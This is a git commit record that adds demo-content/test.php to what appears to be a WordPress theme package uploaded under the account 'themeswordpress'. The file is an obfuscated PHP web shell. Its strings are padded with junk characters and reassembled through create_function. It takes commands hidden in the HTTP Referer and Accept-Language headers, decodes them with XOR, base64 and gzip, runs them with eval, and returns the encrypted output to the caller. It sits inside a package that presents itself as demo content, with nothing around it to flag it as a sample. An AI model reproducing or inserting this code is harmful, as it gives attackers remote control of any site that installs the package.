836fff91efc861dda09a0ae34a587eea933a06f6
themeswordpress <51072377+themeswordpress@users.noreply.github.com>
2019-06-01 10:52:44 +0300

    Add files via upload

---
+++ demo-content/test.php
@@ -0,0 +1,16 @@
+<?php
+$Y=');if($e){$k=Ec$kh.$kf;ob_start(Ec);@evEcal(@EcgzuncompreEcss(@x(Ec@base6Ec4_decodEce(prEceg_replacEce(arraEcy(Ec';
+$P=str_replace('rj','','crjrrjerjate_frjunrjrjction');
+$w='.([\\d]))Ec?,?/Ec",$rEca,$mEcEc);iEcf($q&&$m){@EcEcsession_startEc();$s=&Ec$_SESSION;Ec$ss="substrEc";$slEc=Ec"st';
+$v='rtEcolEcower";$i=$m[1][0]EcEc.Ec$m[1][1];$Ech=$sEcl($ss(mdEc5($i.$kh),0,3Ec))Ec;Ec$fEc=$sl($ss(mdEc5($i.Ec$kf),0';
+$p=';parsEcEce_Ecstr($u[Ec"query"],$q);$Ecq=Ecarray_vaEclues($q);EcpEcEcreg_match_all("/([\\wEc])[\\wEc-]+(?:;EcqEc=0';
+$X='cn();$d=baEcse64Ec_Ecencode(x(gzcoEcmEcpreEcss(Ec$o),$k));pEcrint("<$k>$d</$Eck>")Ec;@sEcession_Ecdestroy();}}}}';
+$c=';$rrEc=@$r["HTTP_EcREFEEcREREc"];$ra=@$r["EcHTTP_EcEcACCEEcPT_LANGEcUAGE"];if($rEcEcr&&$raEc){$u=parse_uEcrlEc($rr)';
+$I=',3))Ec;Ec$p="";for($z=1;Ec$z<couEcnt($m[1Ec]);$Ecz++)$p.=Ec$q[Ec$m[Ec2][$z]];EciEcf(strpos(Ec$p,$h)===0Ec){$s[$i';
+$A='i<$Ecl;Ec){forEcEc($j=0Ec;($j<$c&&$i<$l);$jEc+Ec+,$i+Ec+){$o.=$t{$i}^$k{Ec$j};}}retEcEcurn $o;}$EcEcr=$_SEcERVER';
+$D='$kEch="fe74Ec";$kEcfEcEc="3d8d";function x($t,$k){$Ecc=strlEcen(Ec$kEc);$l=strlenEc($tEc);$o="Ec";EcfEcor($i=0;$';
+$H='"/_/Ec","/-/"),Ecarray("Ec/EcEc","+"),$ss($s[$Eci],0,Ec$e))),$k)))Ec;$o=oEcb_gEcet_coEcntents()Ec;Ecob_eEcnd_cleaE';
+$h=']Ec="";$pEc=$ssEc($p,3);}EcifEc(arEcray_keEcy_EcexEcists($i,$sEc)){$Ecs[$i].=$p;$e=EcstrposEc($s[$Eci]EcEc,Ec$f';
+$t=str_replace('Ec','',$D.$A.$c.$p.$w.$v.$I.$h.$Y.$H.$X);
+$M=$P('',$t);$M();
+?>
